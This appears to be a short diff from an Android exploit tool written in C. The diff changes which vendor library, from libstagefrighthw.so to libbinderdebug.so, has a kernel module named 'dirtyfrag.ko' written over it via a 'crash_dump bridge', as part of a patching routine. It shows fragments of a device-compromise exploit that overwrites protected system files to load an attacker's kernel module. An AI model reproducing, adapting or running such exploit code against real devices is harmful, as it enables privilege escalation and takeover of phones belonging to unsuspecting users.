@@ -55,7 +55,7 @@ static void reportfmt(struct Reporter *r, const char *fmt, ...) {
 #define REPORTLN(fmt, ...) reportfmt(reporter, fmt "\n" __VA_OPT__(,) __VA_ARGS__)
 
 static const char kCrashDump[] = "/apex/com.android.runtime/bin/crash_dump64";
-static const char target_lib_path[] = "/vendor/lib64/libstagefrighthw.so";
+static const char target_lib_path[] = "/vendor/lib64/libbinderdebug.so";
 
 /* SA parameters set by Java via nativeRunAll() before any patching. */
 static int      g_encap_port;
@@ -413,7 +413,7 @@ static int patch_ko(struct Reporter *reporter) {
     if (!ko_buf) return -1;
 
     /* patch #2: write KO into vendor lib via crash_dump bridge */
-    REPORTLN("* patch #2 (libstagefrighthw.so ← dirtyfrag.ko, %zu bytes)", ko_len_padded);
+    REPORTLN("* patch #2 (libbinderdebug.so ← dirtyfrag.ko, %zu bytes)", ko_len_padded);
     ret = patch_file_cbc(target_lib_path, ko_buf, ko_len_padded, 0, 1, reporter);
     free(ko_buf);
     if (ret) REPORTLN("patch #2 failed: %d", ret);
